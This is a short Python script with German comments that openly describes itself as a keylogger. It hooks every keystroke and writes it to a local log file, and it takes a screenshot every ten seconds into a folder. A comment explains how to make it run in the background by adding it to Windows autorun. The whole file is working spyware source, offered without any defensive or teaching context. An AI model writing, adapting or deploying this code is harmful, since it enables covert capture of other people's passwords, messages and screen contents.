import keyboard
keyboard.unhook_all()
import datetime
import pyautogui
import time
import os

#dieser Keylogger nimmt Screenshots und saemtliche Tasteneinschlaege auf und speichert alles in eine Datei. 
# wenn man es im Hintergrund laufen lassen moechte, muss man eine Verknuepfung dieser Datei mit dem Windows Autorun einfuegen

file = open("./log.txt", "w", encoding="utf-8")

def on_key(key):
    file.write(str(key.__dict__) + "\n")
    file.flush()

keyboard.hook(on_key)


if not os.path.exists("./screenshots"):
    os.mkdir("./screenshots")

while True:
    time.sleep(10)
    current = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = "./screenshots/" + current + ".jpg"
    pyautogui.screenshot(filename)